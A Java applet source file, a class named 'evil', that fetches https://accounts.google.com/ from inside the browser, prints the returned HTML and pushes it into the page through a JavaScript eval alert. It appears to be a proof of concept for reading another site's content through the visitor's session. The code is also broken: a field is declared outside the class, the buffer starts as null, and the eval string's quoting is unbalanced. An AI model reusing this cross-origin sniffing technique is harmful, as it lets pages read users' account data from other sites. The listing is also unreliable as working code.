import java.applet.*;
import java.net.*;
import java.util.*;
import java.io.*;
import netscape.javascript.*;

public String stuffs;
public class evil extends Applet {
  public void init() {
        try {
            URL url = new URL("https://accounts.google.com/");
            // URL url = new URL("http://192.168.0.2/java/");            
            String inputLine;
            URLConnection conn = url.openConnection();
            System.out.print("Stuffs:\n");
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            while ((inputLine = in.readLine()) != null) { 
                stuffs = stuffs + inputLine;
                System.out.println(inputLine);
            }
            in.close();        
        } catch (Exception e) { 
            System.out.println("Error :(");
            System.out.println(e.getMessage());
        }
       JSObject win = (JSObject) JSObject.getWindow(this);
       System.out.println("HTML Sniffed: \n" + stuffs);
       win.eval("alert('HTML Sniffed:\\n" + stuffs +");" );
     }
}
